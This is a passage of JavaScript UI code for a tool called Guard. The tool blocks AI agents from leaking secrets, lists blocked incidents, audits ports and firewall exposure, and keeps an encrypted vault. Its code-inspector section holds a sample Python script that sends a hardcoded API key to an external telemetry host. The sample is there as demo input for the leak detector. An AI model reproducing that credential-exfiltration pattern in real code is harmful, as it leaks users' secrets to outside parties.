      return function () { if (confirmTimer.current) clearTimeout(confirmTimer.current); };
    }, []);

    function handleSelectIncident(id) {
      setActiveIncidentId(id);
      try { localStorage.setItem("msg_guard_active_id", id); } catch (e) {}
    }

    function handleFilterChange(newFilter) {
      setFilter(newFilter);
      try { localStorage.setItem("msg_guard_filter", newFilter); } catch (e) {}
    }

    useEffect(function () {
      loadDynamicSessionTitles();
    }, []);

    useEffect(function () {
      if (!activeIncidentId) return;
      var list = (data && data.items) || [];
      if (!list.some(function (i) { return i.id === activeIncidentId; })) handleSelectIncident("");
    }, [data]);
    if (!data) return h(Card, { title: "live protection", className: "wide" }, h(Empty, { text: "loading…" }));
    if (data.status === "error") return h(Card, { title: "live protection", className: "wide" },
      h("div", { className: "yg-err" }, "● " + data.message));

    function delIncident(id) {
      if (histBusy) return;
      if (confirmAct !== "del:" + id) { armConfirm("del:" + id); return; }
      resetConfirm();
      setHistBusy(id);
      post("/incidents/delete", { incident: id }).then(function (r) {
        setHistBusy("");
        if (r && r.status === "ok") {
          if (activeIncidentId === id) handleSelectIncident("");
          if (p.onChanged) p.onChanged();
        } else {
          setHistNote((r && r.message) || (currentLang === "ru" ? "Не удалось удалить инцидент." : "Could not delete the incident."));
        }
      }).catch(function () {
        setHistBusy("");
        setHistNote(currentLang === "ru" ? "Нет связи с бэкендом Guard." : "Could not reach Guard backend.");
      });
    }

    function clearHistory(scope) {
      if (histBusy) return;
      var key = scope === "all" ? "all" : "resolved";
      if (confirmAct !== key) { armConfirm(key); return; }
      resetConfirm();
      setHistBusy("__all__");
      setHistNote("");
      post("/incidents/clear", { scope: key }).then(function (r) {
        setHistBusy("");
        if (r && r.status === "ok") {
          setHistNote((currentLang === "ru" ? "Удалено записей: " : "Removed: ") + (r.removed || 0));
          handleSelectIncident("");
          if (p.onChanged) p.onChanged();
        } else {
          setHistNote((r && r.message) || (currentLang === "ru" ? "Не удалось очистить журнал." : "Could not clear the log."));
        }
      }).catch(function () {
        setHistBusy("");
        setHistNote(currentLang === "ru" ? "Нет связи с бэкендом Guard." : "Could not reach Guard backend.");
      });
    }

    const rawItems = data.items || [];
    const activeFocal = (activeIncidentId && rawItems.find(function (i) { return i.id === activeIncidentId; }))
      || rawItems.filter(function (i) { return i.status === "pending"; })[0] || null;
    const items = rawItems.concat().sort(function (a, b) {
      const ta = a.at || "", tb = b.at || "";
      if (ta < tb) return -1;
      if (ta > tb) return 1;
      const ia = a.id || "", ib = b.id || "";
      if (ia < ib) return -1;
      if (ia > ib) return 1;
      return 0;
    });
    const pending = items.filter(function (i) { return i.status === "pending"; });
    // The queue is every pending incident, in the same chronological order, always.
    // Selecting one only moves it to the stage; nothing leaves or re-enters the list.
    const otherPending = pending;

    const done = items.filter(function (i) { return i.status !== "pending"; })
      .filter(function (inc) {
        if (filter === "blocked" && inc.status !== "quarantined" && inc.status !== "blocked") return false;
        if (filter === "allowed" && inc.status !== "allowed" && inc.status !== "protected") return false;
        if (!q) return true;
        const hay = (inc.id + " " + (inc.tool || "") + " " + (inc.destination || "") + " " +
          (inc.findings || []).map(function (f) { return f.label || ""; }).join(" ")).toLowerCase();
        return hay.indexOf(q.toLowerCase()) !== -1;
      });

    const FILTERS = [["all", currentLang === "ru" ? "Все" : "All"],
                     ["blocked", currentLang === "ru" ? "Заблокировано" : "Blocked"],
                     ["allowed", currentLang === "ru" ? "Разрешено" : "Allowed"]];

    function fmtPauseTime(sec) {
      const m = Math.floor(sec / 60);
      const s = sec % 60;
      return (m < 10 ? "0" : "") + m + ":" + (s < 10 ? "0" : "") + s;
    }

    return h(React.Fragment, null,
      (p.guardMode === "paused" || p.guardMode === "disabled") ? h("div", { className: "yg-pause-banner" },
        h("div", { style: { display: "flex", alignItems: "center", gap: 8 } },
          h("span", { style: { fontSize: "16px" } }, "⚠️"),
          h("div", null,
            h("b", null, p.guardMode === "paused"
              ? (currentLang === "ru" ? ("Защита приостановлена (осталось " + fmtPauseTime(p.pauseRemaining || 0) + ")") : ("Protection paused (" + fmtPauseTime(p.pauseRemaining || 0) + " left)"))
              : (currentLang === "ru" ? "Защита выключена (Режим полного обхода)" : "Protection disabled (Bypass mode)")),
            h("div", { style: { fontSize: "11px", color: "rgba(253, 230, 138, 0.85)" } },
              currentLang === "ru"
                ? "Запросы и секреты агента передаются во внешнюю сеть без фильтрации."
                : "Agent requests and secrets pass to external network uninspected.")
          )
        ),
        h("button", {
          type: "button",
          className: "yg-btn",
          style: { background: "#10b981", borderColor: "#059669", color: "#fff", fontWeight: 700 },
          onClick: function () { if (p.onSetMode) p.onSetMode("active"); }
        }, currentLang === "ru" ? "▶ Включить защиту сейчас" : "▶ Enable protection now")
      ) : null,
      h(Card, { title: currentLang === "ru" ? "защита в реальном времени" : "live protection", className: "wide" },
        h("div", { className: "yg-shield " + (pending.length ? "bad" : "ok"), style: { marginBottom: 12 } },
          h("span", { className: "yg-big" }, pending.length ? ("⛔ " + pending.length + " action" + (pending.length > 1 ? "s" : "") + " blocked") : (currentLang === "ru" ? "✓ Защищено" : "✓ Protected")),
          h("span", { className: "yg-dim" }, pending.length
            ? (currentLang === "ru" ? "  Агент пытался отправить важные данные. Решите ниже, что делать." : "  An agent tried to send sensitive data. Decide below what should happen.")
            : (currentLang === "ru" ? "  Каждое действие агента проверяется на секреты до запуска." : "  Every agent action is checked for secrets before it runs."))),
        h(VisualSecurityMap, {
          data: data,
          vault: p.vault,
          vaultCount: p.vaultCount,
          refresh: p.onChanged,
          refreshing: p.refreshing,
          guardMode: p.guardMode,
          pauseRemaining: p.pauseRemaining,
          onSetMode: p.onSetMode,
          activeIncidentId: activeIncidentId
        }),
        // If there are other pending incidents, render them cleanly below with interactive selection
        otherPending.length > 0 ? h("div", { style: { marginTop: 14 } },
          h("div", { className: "yg-sub", style: { marginBottom: 8 } },
            currentLang === "ru" ? ("Заблокированные действия агента (" + otherPending.length + "):") : ("Blocked agent actions (" + otherPending.length + "):")),
          otherPending.map(function (inc) {
            return h(IncidentCard, {
              key: inc.id,
              inc: inc,
              isPendingQueue: true,
              isActive: !!activeFocal && inc.id === activeFocal.id,
              onSelect: handleSelectIncident,
              onChanged: p.onChanged
            });
          })
        ) : null
      ),

      h(Card, { title: currentLang === "ru" ? "история инцидентов" : "incident history", className: "wide grow" },
        h("div", { className: "yg-hst-tools" },
          h("input", {
            className: "yg-input yg-hst-search",
            placeholder: currentLang === "ru" ? "Поиск по тексту или ID…" : "Search by text or ID…",
            value: q, onChange: function (e) { setQ(e.target.value); }
          }),
          h("div", { className: "yg-kinds", style: { margin: 0 } },
            FILTERS.map(function (f) {
              return h("button", {
                key: f[0], type: "button",
                className: "yg-kind" + (filter === f[0] ? " on" : ""),
                onClick: function () { handleFilterChange(f[0]); }
              }, f[1]);
            })),
          (done.length || items.length) ? h("div", { className: "yg-hst-actions", style: { display: "flex", gap: 6, alignItems: "center" } },
            histNote ? h("span", { className: "yg-dim yg-small", style: { marginRight: 4 } }, histNote) : null,
            done.length ? h("button", {
              type: "button",
              className: "yg-btn " + (confirmAct === "resolved" ? "yg-btn-confirm" : "ghost"),
              disabled: !!histBusy,
              title: currentLang === "ru" ? "Удалить все решённые инциденты" : "Clear resolved history",
              onClick: function () { clearHistory("resolved"); }
            }, histBusy === "__all__" ? "…" : (confirmAct === "resolved"
              ? (currentLang === "ru" ? "ТОЧНО ОЧИСТИТЬ? (ПОДТВЕРДИТЕ)" : "REALLY CLEAR? (CONFIRM)")
              : (currentLang === "ru" ? "🗑 Очистить историю" : "🗑 Clear history"))) : null,
            items.length ? h("button", {
              type: "button",
              className: "yg-btn " + (confirmAct === "all" ? "yg-btn-confirm" : "ghost danger"),
              disabled: !!histBusy,
              title: currentLang === "ru" ? "Полностью очистить весь журнал (включая ожидающие)" : "Clear the entire log (including pending)",
              onClick: function () { clearHistory("all"); }
            }, histBusy === "__all__" ? "…" : (confirmAct === "all"
              ? (currentLang === "ru" ? "ТОЧНО УДАЛИТЬ? (ПОДТВЕРДИТЕ)" : "REALLY DELETE? (CONFIRM)")
              : (currentLang === "ru" ? "🗑 Очистить всё" : "🗑 Clear all"))) : null)
          : null),
        done.length ? h("div", { className: "yg-list" },
          done.slice(0, 50).map(function (inc) {
            var accSummary = h("summary", { className: "yg-acc-sum" },
              h("span", { className: "yg-acc-id" }, inc.id || ""),
              h("span", { className: "yg-acc-status" }, getStatusText(inc.status)),
              h("span", { className: "yg-dim yg-acc-time" }, fmtTs(inc.at)),
              h("span", { className: "yg-dim yg-acc-how" }, (inc.tool || "") + " → " + (inc.destination || "")),
              h("button", {
                type: "button",
                className: "yg-btn ghost yg-acc-del" + (confirmAct === "del:" + inc.id ? " yg-btn-confirm" : ""),
                disabled: !!histBusy,
                title: confirmAct === "del:" + inc.id
                  ? (currentLang === "ru" ? "Нажмите ещё раз, чтобы удалить" : "Click again to delete")
                  : (currentLang === "ru" ? "Удалить инцидент" : "Delete incident"),
                onClick: function (e) { e.preventDefault(); e.stopPropagation(); delIncident(inc.id); }
              }, histBusy === inc.id ? "…" : (confirmAct === "del:" + inc.id ? "✓?" : "🗑")));
            return h("details", { key: inc.id, className: "yg-acc", open: false }, accSummary,
              h(IncidentCard, { inc: inc, onChanged: p.onChanged, inAccordion: true }));
          }))
          : h(Empty, { text: "No incidents yet." })));
  }

  // =========================================================================
  // TASK 3.3: CODE INSPECTOR (AI Agent Scripts & Commands Audit, no YadroLang)
  // =========================================================================
  const SAMPLE = "import os, requests\n\n# AI agent automated script: process invoice and telemetry\nOPENAI_API_KEY = \"sk-proj-aB9xK1mZ8Qp2wE5rT7yU4iO6pL0sD3fG2hJ1kL4\"\nuser_prompt = \"Process user payment\"\n\n# Leak: transmitting raw secret key to external collector\nres = requests.post(\n    \"https://analytics-collector.external-api.org/telemetry\",\n    headers={\"Authorization\": f\"Bearer {OPENAI_API_KEY}\"},\n    json={\"task\": user_prompt, \"key\": OPENAI_API_KEY}\n)\nprint(\"Telemetry sent:\", res.status_code)\n";

  function CheckPanel() {
    const [code, setCode] = useState(SAMPLE);
    const [title, setTitle] = useState("");
    const [busy, setBusy] = useState(false);
    const [r, setR] = useState(null);
    const [report, setReport] = useState("");

    function analyze() {
      setBusy(true); setReport("");
      post("/analyze", { code: code, title: title })
        .then(setR).catch(function () { setR({ status: "error", message: "Could not reach the Guard backend." }); })
        .finally(function () { setBusy(false); });
    }
    function applyFix() { if (r && r.autofix) { setCode(r.autofix.fixed_code); setR(null); } }
    function openReport() { post("/report", { code: code }).then(function (d) { setReport(d.html || ""); }).catch(function () {}); }

    return h(Card, { title: currentLang === "ru" ? "проверка кода и команд агентов" : "check agent code before it runs", className: "wide" },
      h("div", { className: "yg-dim yg-small" },
        currentLang === "ru"
          ? "Проверка кода, скриптов и команд ИИ-агентов (Python, Bash, JS, конфигурации MCP) перед запуском на утечки секретов и опасные системные вызовы."
          : "Audit AI agent scripts, commands, and pipelines (Python, Bash, JS, MCP calls) for secret leaks and dangerous calls before execution."),
      h("input", {
        className: "yg-input",
        placeholder: currentLang === "ru" ? "Название (необязательно), например: Агент платежей" : "Name (optional), e.g. payment agent",
        value: title, onChange: function (e) { setTitle(e.target.value); }
      }),
      h("textarea", {
        className: "yg-code-in", spellCheck: false,
        placeholder: currentLang === "ru" ? "Вставьте скрипт или команду агента (Python, Bash, JS, JSON)..." : "Paste agent code or script here",
        value: code, onChange: function (e) { setCode(e.target.value); }
      }),
      h("div", { className: "yg-actions" },
        h("button", { className: "yg-btn", disabled: busy || !code.trim(), onClick: analyze },
          busy ? (currentLang === "ru" ? "Проверка…" : "Checking…") : (currentLang === "ru" ? "Проверить код" : "Check code")),
        h("button", { className: "yg-btn ghost", onClick: function () { setCode(SAMPLE); setR(null); } },
          currentLang === "ru" ? "Пример скрипта" : "Load example"),
        r && r.status !== "error" ? h("button", { className: "yg-btn ghost", onClick: openReport },
          currentLang === "ru" ? "Полный отчёт" : "Open full report") : null),
      r ? h(Result, { r: r, onFix: applyFix }) : null,
      report ? h("div", { className: "yg-report" },
        h("div", { className: "yg-actions" },
          h("span", { className: "yg-sub" }, currentLang === "ru" ? "Полный отчёт" : "Full report"),
          h("button", { className: "yg-btn ghost yg-right", onClick: function () { setReport(""); } },
            currentLang === "ru" ? "Закрыть отчёт" : "Close report")),
        h("iframe", { className: "yg-frame", sandbox: "", srcDoc: report, title: "report" })) : null);
  }

  function Result(p) {
    const r = p.r;
    if (r.status === "error") return h("div", { className: "yg-err yg-gap" }, "● " + r.message);
    if (r.status === "ok") return h("div", { className: "yg-gap" },
      h("div", { className: "yg-shield ok" }, h("span", { className: "yg-big" }, "✓ No leaks found"),
        h("span", { className: "yg-dim" }, "  in " + r.lines + " lines")),
      (r.sanitized || []).map(function (s, i) {
        return h("div", { className: "yg-row", key: i }, h(Chip, { label: s.label }),
          h("span", { className: "yg-dim" }, "protected on line " + s.line + " with " + s.wrapper + "()"));
      }), h(Gaps, { gaps: r.known_gaps }));
    const a = r.autofix;
    return h("div", { className: "yg-gap" },
      h("div", { className: "yg-shield bad" }, h("span", { className: "yg-big" }, "⛔ Leak on line " + r.line),
        h("span", { className: "yg-code" }, r.code)),
      h("div", { className: "yg-inc-story" }, r.why),
      h("div", null, (r.labels || []).map(function (l, i) { return h(Chip, { key: i, label: l }); })),
      h("div", { className: "yg-inc-story" },
        (r.sources || []).length ? "The data comes from " : "Sensitive data ",
        (r.sources || []).map(function (s, i) { return h("b", { key: i, className: "yg-mono" }, (i ? ", " : "") + s.name + "() on line " + s.line); }),
        " and leaves through ", h("b", { className: "yg-mono" }, r.sink.name), " (" + r.sink.human + ")."),
      h("div", { className: "yg-sub" }, "How to send it legally"),
      (r.quarantine || []).map(function (q, i) {
        return h("div", { className: "yg-row", key: i }, h("span", { className: "yg-k" }, q.label),
          h("span", null, q.options.length ? q.options.map(function (o) { return o.human + " (" + o.fn + ")"; }).join(" · ")
            : "no allowed protection: this data must not leave the program"));
      }),
      a ? h("div", null, h("div", { className: "yg-sub" }, "Automatic fix"),
        h("div", { className: "yg-diff old" }, "− " + a.before.trim()),
        h("div", { className: "yg-diff new" }, "+ " + a.after.trim()),
        h("div", { className: "yg-actions" },
          a.verified ? h("span", { className: "yg-ok" }, "✓ verified: the fixed code passes the check") :
            h("span", { className: "yg-warn" }, "⚠ needs manual review"),
          h("button", { className: "yg-btn good", disabled: !a.verified, onClick: p.onFix }, "Apply fix to the code above"))) :
        h("div", { className: "yg-dim yg-small" }, "No safe automatic fix for this leak. Use one of the protections above."),
      h(Gaps, { gaps: r.known_gaps }));
  }

  function Gaps(p) {
    if (!p.gaps || !p.gaps.length) return null;
    return h("details", { className: "yg-gaps" }, h("summary", null, currentLang === "ru" ? "ЧЕСТНЫЕ ОГРАНИЧЕНИЯ ЭТОЙ ПРОВЕРКИ" : "Honest limits of this check"),
      h("ul", null, p.gaps.map(function (g, i) { return h("li", { key: i }, g); })));
  }

  const SEV = { critical: ["Critical", "bad"], high: ["High", "bad"], medium: ["Medium", "warn"], low: ["Low", "ok"], info: ["Safe", "ok"] };
  const REACH = { all_networks: "Open to every network", local_network: "Open to this local network", this_computer: "Only this computer" };

  function ExposurePanel() {
    const [data, setData] = useState(null);
    const [busy, setBusy] = useState(false);
    const [showSafe, setShowSafe] = useState(false);
    function load(force) {
      setBusy(true);
      SDK.fetchJSON(API + "/exposure" + (force ? "?refresh=1" : ""))
        .then(setData).catch(function () { setData({ status: "error", message: "Guard backend is not reachable." }); })
        .finally(function () { setBusy(false); });
    }
    useEffect(function () { load(false); }, []);
    function changed() { load(true); }

    if (!data) return h(Card, { title: "network exposure", className: "wide" }, h(Empty, { text: "Scanning ports… this takes about 10 seconds." }));
    if (data.status === "error") return h(Card, { title: "network exposure", className: "wide" }, h("div", { className: "yg-err" }, "● " + data.message));

    const items = data.listeners || [];
    const risky = items.filter(function (l) { return l.severity !== "info"; });
    const safe = items.filter(function (l) { return l.severity === "info"; });
    const c = data.counts || {};
    const bad = (c.critical || 0) + (c.high || 0);

    return h(React.Fragment, null,
      h(Card, { title: currentLang === "ru" ? "открытые порты" : "network exposure", className: "wide" },
        h("div", { className: "yg-shield " + (bad ? "bad" : "ok") },
          h("span", { className: "yg-big" }, bad ? "⛔ " : "✓ ", T("Exposure score "), data.score, "/100"),
          h("span", { className: "yg-dim" }, "  ", c.critical || 0, T(" critical · "), c.high || 0, T(" high · "),
            c.medium || 0, T(" medium · "), c.low || 0, T(" low"))),
        h("div", { className: "yg-dim yg-small" },
          currentLang === "ru"
            ? "Программы на этом компьютере, принимающие сетевые подключения, и уровень их открытости. Сканирование ничего не меняет в системе."
            : "Programs on this computer that accept network connections, and who can reach them. Nothing is changed by this scan."),
        h("div", { className: "yg-actions" },
          h("button", { className: "yg-btn", disabled: busy, onClick: function () { load(true); } },
            busy ? (currentLang === "ru" ? "Сканирование…" : "Scanning…") : (currentLang === "ru" ? "Проверить снова" : "Check again")),
          h("span", { className: "yg-dim yg-small" },
            (currentLang === "ru" ? "Последняя проверка: " : "Last check ") + ago(data.scanned_at))),
        risky.length ? risky.map(function (l) { return h(PortRow, { key: l.proto + l.port + "/" + l.pid, l: l, onChanged: changed }); })
          : h(Empty, { text: "Nothing risky is open to the network." }),
        h(FixHistory, { stamp: data.scanned_at, onChanged: changed }),
        h("details", { className: "yg-gaps" }, h("summary", null, currentLang === "ru" ? "ЧЕСТНЫЕ ОГРАНИЧЕНИЯ ЭТОГО СКАНИРОВАНИЯ" : "Honest limits of this scan"),
          h("ul", null, (data.limits || []).map(function (g, i) { return h("li", { key: i }, g); })))),
      h(Card, { title: "safe listeners", className: "wide" },
        h("button", { className: "yg-btn ghost", onClick: function () { setShowSafe(!showSafe); } },
          (showSafe ? (currentLang === "ru" ? "Скрыть " : "Hide ") : (currentLang === "ru" ? "Показать " : "Show ")) + safe.length + " safe listeners"),
        showSafe ? safe.map(function (l) { return h(PortRow, { key: l.proto + l.port + "/" + l.pid, l: l, compact: true }); }) : null));
  }

  function addrText(l) {
    const a = l.addresses && l.addresses.length ? l.addresses : [l.address];
    return a.map(function (x) { return x === "::" ? "[::]" : x; }).join(" + ");
  }

  function fwText(l) {
    if (l.firewall === "blocked") return currentLang === "ru" ? "брандмауэр блокирует извне" : "firewall blocks it";
    if (l.firewall === "off") return currentLang === "ru" ? "брандмауэр отключен" : "firewall is OFF";
    if (l.firewall === "allowed") {
      let t = currentLang === "ru" ? "брандмауэр разрешает входящие" : "firewall lets it in";
      if (l.firewall_scope === "local_subnet") t += currentLang === "ru" ? " (только из локальной сети)" : " (from your local network only)";
      else if (l.firewall_scope === "custom") t += currentLang === "ru" ? " (с некоторых адресов)" : " (from some addresses)";
      if (l.firewall_rule) t += " (" + (currentLang === "ru" ? "правило " : "rule ") + l.firewall_rule + ")";
      return t;
    }
    return currentLang === "ru" ? "брандмауэр: не проверено" : "firewall: not verified";
  }

  function PortActions(p) {
    const l = p.l;
    const [busy, setBusy] = useState("");
    const [msg, setMsg] = useState("");
    function act(action, extra) {
      setBusy(action); setMsg("");
      const body = Object.assign({ action: action, proto: l.proto, port: l.port, pid: l.pid }, extra || {});
      post("/exposure/act", body)
        .then(function (r) {
          if (r.status === "ok") { p.onChanged(); }
          else { setMsg(r.message || "Could not do it."); }
        })
        .catch(function () { setMsg("Could not reach the Guard backend."); })
        .finally(function () { setBusy(""); });
    }
    const btns = [];
    if (l.actions && l.actions.indexOf("block_port") >= 0)
      btns.push(h("button", { key: "bp", className: "yg-btn", disabled: !!busy, onClick: function () { act("block_port"); } }, "Block in firewall"));
    if (l.actions && l.actions.indexOf("unblock") >= 0)
      btns.push(h("button", { key: "ub", className: "yg-btn ghost", disabled: !!busy, onClick: function () { act("unblock"); } }, "Remove firewall block"));
    if (l.actions && l.actions.indexOf("disable_service") >= 0 && l.service_name)
      btns.push(h("button", { key: "ds", className: "yg-btn bad", disabled: !!busy, onClick: function () {
        if (window.confirm(T("Turn off this Windows service? Windows will ask you to confirm. You can undo it here."))) act("disable_service");
      } }, "Turn off this service"));
    if (l.actions && l.actions.indexOf("stop_program") >= 0)
      btns.push(h("button", { key: "sp", className: "yg-btn bad", disabled: !!busy, onClick: function () {
        if (window.confirm(T("Stop this program now? Unsaved work in it may be lost."))) act("stop_program");
      } }, "Stop the program"));
    if (l.settings_page)
      btns.push(h("button", { key: "st", className: "yg-btn ghost", disabled: !!busy, onClick: function () { act("settings", { page: l.settings_page }); } }, "Open Windows Settings"));
    btns.push(h("button", { key: "tr", className: "yg-btn ghost", disabled: !!busy, onClick: function () { act(l.trusted ? "untrust" : "trust"); } },
      l.trusted ? (currentLang === "ru" ? "Удалить из доверенных" : "Stop trusting") : (currentLang === "ru" ? "ДОБАВИТЬ В ДОВЕРЕННЫЕ" : "Mark as trusted")));
    return h("div", { className: "yg-actions" }, btns,
      busy ? h("span", { className: "yg-dim yg-small" }, "Working with Windows…") : null,
      msg ? h("span", { className: "yg-err yg-small" }, msg) : null);
  }

  function FixHistory(p) {
    const [fixes, setFixes] = useState([]);
    const [busy, setBusy] = useState("");
    function load() {
      SDK.fetchJSON(API + "/exposure/fixes")
        .then(function (r) { if (r.status === "ok") setFixes(r.items || []); })
        .catch(function () {});
    }
    useEffect(function () { load(); }, [p.stamp]);
    function undo(fixId) {
      setBusy(fixId);
      post("/exposure/act", { action: "undo", fix: fixId })
        .then(function (r) {
          if (r.status === "ok") { p.onChanged(); load(); }
          else { window.alert(r.message || "Could not undo."); }
        })
        .catch(function () { window.alert("Could not reach the Guard backend."); })
        .finally(function () { setBusy(""); });
    }
    if (!fixes.length) return null;
    return h("div", { className: "yg-gap" },
      h("div", { className: "yg-sub" }, "Changes made by Guard (" + fixes.length + ")"),
      fixes.map(function (f) {
        return h("div", { className: "yg-row", key: f.id },
          h("span", null, T(f.action), ": ", h("b", { className: "yg-mono" }, f.target), " (", ago(f.at), ")"),
          f.undone ? h("span", { className: "yg-dim" }, "undone") :
            h("button", { className: "yg-btn ghost", disabled: busy === f.id, onClick: function () { undo(f.id); } },
              busy === f.id ? "…" : "Undo"));
      }));
  }

  function PortRow(p) {
    const l = p.l, s = SEV[l.severity] || ["?", "warn"];
    return h("div", { className: "yg-inc " + (l.severity === "critical" || l.severity === "high" ? "pending" : "done") },
      h("div", { className: "yg-inc-top" },
        h(Pill, { kind: s[1] }, s[0]),
        h("b", null, l.service),
        h("span", { className: "yg-dim yg-right yg-mono" },
          l.proto + " " + addrText(l), " ", T("port"), " ", l.port)),
      h("div", { className: "yg-inc-story" },
        h("b", { className: "yg-mono" }, l.process), " ", T("(pid"), " ", l.pid, ") · ", T(REACH[l.reach] || l.reach),
        l.reach === "this_computer" ? null : " · " + fwText(l),
        (l.tags || []).indexOf("public-tunnel") >= 0 ? h("span", { className: "yg-err" }, " · public internet tunnel") : null),
      l.trusted ? h("div", { className: "yg-ok yg-small" }, currentLang === "ru" ? "Вы добавили этот порт в доверенные." : "You marked this as trusted.") : null,
      p.compact ? null : h("div", { className: "yg-dim" }, T(l.why)),
      p.compact || l.fix === "Nothing to do." ? null : h("div", { className: "yg-ok yg-small" }, T("What to do:") + " " + T(l.fix)),
      p.compact ? null : h(PortActions, { l: l, onChanged: p.onChanged }));
  }

  const KINDS = [["Credentials", "Password, API key or token"], ["Financial", "Card or bank account"],
    ["PII", "Personal data (name, phone, email)"], ["Health", "Medical data"], ["Location", "Location data"]];

  // =========================================================================
  // TASK 3.4: VAULT PANEL (Friendly Secret Name & msg_tok_ Tokens)
  // =========================================================================
  function VaultPanel(p) {
    const [title, setTitle] = useState("");
    const [secret, setSecret] = useState("");
    const [label, setLabel] = useState("Credentials");
    const [msg, setMsg] = useState(null);
    const [busy, setBusy] = useState(false);

    function save() {
      setBusy(true); setMsg(null);
      post("/vault", { secret: secret, label: label, title: title })
        .then(function (r) {
          if (r.status === "ok") {
            setSecret(""); setTitle("");
            setMsg({
              ok: true,
              text: currentLang === "ru"
                ? ("Сохранено. Секрету присвоен токен " + (r.token || "").slice(0, 26) + "… вместо реального значения.")
                : (T("Saved. Agents now get the token ") + (r.token || "").slice(0, 26) + T("… instead of the real value, and any attempt to send the real value is blocked."))
            });
            p.onChanged();
          } else setMsg({ ok: false, text: r.message || "Could not save." });
        })
        .catch(function () { setMsg({ ok: false, text: "Could not reach the Guard backend." }); })
        .finally(function () { setBusy(false); });
    }

    const items = (p.vault && p.vault.items) || [];
    const live = items.filter(function (v) { return !v.deleted; });
    const trash = items.filter(function (v) { return v.deleted; });

    function op(body, okText) {
      setBusy(true); setMsg(null);
      post("/vault/op", body)
        .then(function (r) {
          setMsg(r.status === "ok" ? { ok: true, text: T(okText) + (r.path ? " " + r.path : "") } : { ok: false, text: r.message || "Could not do it." });
          if (r.status === "ok") p.onChanged();
        })
        .catch(function () { setMsg({ ok: false, text: "Could not reach the Guard backend." }); })
        .finally(function () { setBusy(false); });
    }

    function addFile(f) {
      if (!f) return;
      if (f.size > 10 * 1024 * 1024) { setMsg({ ok: false, text: "This file is too large (limit 10 MB)." }); return; }
      const rd = new FileReader();
      rd.onload = function () {
        const s = String(rd.result || ""), data = s.slice(s.indexOf(",") + 1);
        setBusy(true); setMsg(null);
        post("/vault/file", { data: data, filename: f.name, label: label, title: f.name })
          .then(function (r) {
            setMsg(r.status === "ok" ? { ok: true, text: "File encrypted and saved. Agents cannot send its contents." } : { ok: false, text: r.message || "Could not save." });
            if (r.status === "ok") p.onChanged();
          })
          .catch(function () { setMsg({ ok: false, text: "Could not reach the Guard backend." }); })
          .finally(function () { setBusy(false); });
      };
      rd.readAsDataURL(f);
    }

    return h(Card, { title: currentLang === "ru" ? "сейф · ваши секреты, зашифрованы" : "vault · your secrets, encrypted", className: "wide" },
      h("div", { className: "yg-dim yg-small" },
        currentLang === "ru"
          ? "Добавьте секрет, который хотите защитить. Он шифруется механизмом Windows DPAPI и никогда не показывается в открытом виде. Агентам передаётся только токен msg_tok_..."
          : (T("Add a secret you want to protect. It is encrypted with your Windows account ") + T("and never shown again here. Guard blocks any agent that tries to send it."))),
      // Mandatory secret title input
      h("input", {
        className: "yg-input",
        placeholder: currentLang === "ru" ? "Название секрета (например: Ключ OpenAI, Карта Visa, Токен GitHub)" : "Secret name (e.g. OpenAI Key, Visa Card, GitHub Token)",
        value: title, onChange: function (e) { setTitle(e.target.value); }
      }),
      h("input", {
        className: "yg-input", type: "password", autoComplete: "off",
        placeholder: currentLang === "ru" ? "Значение секрета (пароль, токен, приватный ключ)" : "Paste the secret value",
        value: secret, onChange: function (e) { setSecret(e.target.value); }
      }),
      h("div", { className: "yg-kinds", role: "radiogroup", "aria-label": "Kind of secret" },
        KINDS.map(function (k) {
          return h("button", {
            key: k[0], type: "button", role: "radio", "aria-checked": label === k[0],
            className: "yg-kind" + (label === k[0] ? " on" : ""),
            onClick: function () { setLabel(k[0]); }
          }, k[1]);
        })),
      h("div", { className: "yg-actions" },
        h("button", {
          className: "yg-btn", disabled: busy || !secret || !title.trim(),
          onClick: save
        }, busy ? (currentLang === "ru" ? "Шифрование…" : "Encrypting…") : (currentLang === "ru" ? "Защитить этот секрет" : "Protect this secret"))),
      h("div", { className: "yg-actions" },
        h("label", { className: "yg-btn ghost" }, currentLang === "ru" ? "Добавить файл" : "Add a file",
          h("input", { type: "file", style: { display: "none" }, onChange: function (e) { addFile(e.target.files && e.target.files[0]); e.target.value = ""; } })),
        h("span", { className: "yg-dim yg-small" }, "Up to 10 MB: .env, keys, wallet files, documents.")),
      msg ? h("div", { className: msg.ok ? "yg-ok yg-small" : "yg-err yg-small" }, msg.text) : null,
      h("div", { className: "yg-sub" }, (currentLang === "ru" ? "Под защитой: " : "Protected: ") + live.length),
      live.map(function (v) { return h(VaultItem, { key: v.token, v: v, op: op, busy: busy }); }),
      trash.length ? h("details", { className: "yg-gaps" }, h("summary", null, (currentLang === "ru" ? "Корзина (" : "Trash (") + trash.length + ")"),
        h("div", { className: "yg-dim yg-small" }, "Items in the trash are deleted for good after 30 days. While in the trash, agents cannot use them."),
        trash.map(function (v) {
          return h("div", { className: "yg-row", key: v.token },
            h(Chip, { label: { id: v.label, label: v.title || v.filename || v.label } }),
            h("span", { className: "yg-dim yg-small" }, ago(v.deleted)),
            h("button", { className: "yg-btn ghost", disabled: busy, onClick: function () { op({ op: "restore", token: v.token }, "Restored."); } }, "Restore"),
            h("button", {
              className: "yg-btn bad", disabled: busy, onClick: function () {
                if (window.confirm(T("Delete forever? This cannot be undone."))) op({ op: "purge", token: v.token }, "Deleted forever.");
              }
            }, "Delete forever"));
        })) : null);
  }

  function fmtSize(n) { return n >= 1048576 ? (n / 1048576).toFixed(1) + " MB" : n >= 1024 ? Math.round(n / 1024) + " KB" : n + " B"; }

  function VaultItem(p) {
    const v = p.v;
    const [mode, setMode] = useState("");
    const [val, setVal] = useState("");
    const [menuOpen, setMenuOpen] = useState(false);
    const menuRef = useRef(null);
    function done() { setMode(""); setVal(""); setMenuOpen(false); }

    useEffect(function () {
      if (!menuOpen) return;
      function handleClick(e) { if (menuRef.current && !menuRef.current.contains(e.target)) setMenuOpen(false); }
      function handleKey(e) { if (e.key === "Escape") setMenuOpen(false); }
      document.addEventListener("click", handleClick);
      document.addEventListener("keydown", handleKey);
      return function () {
        document.removeEventListener("click", handleClick);
        document.removeEventListener("keydown", handleKey);
      };
    }, [menuOpen]);

    const friendlyName = v.title || v.filename || (v.token ? v.token.slice(0, 16) + "…" : (currentLang === "ru" ? "Секрет" : "Secret"));

    return h("div", { className: "yg-inc done" },
      h("div", { className: "yg-inc-top" },
        h(Chip, { label: { id: v.label, label: v.label } }),
        h("b", { style: { color: "#ffd700", fontSize: "12.5px" } }, friendlyName),
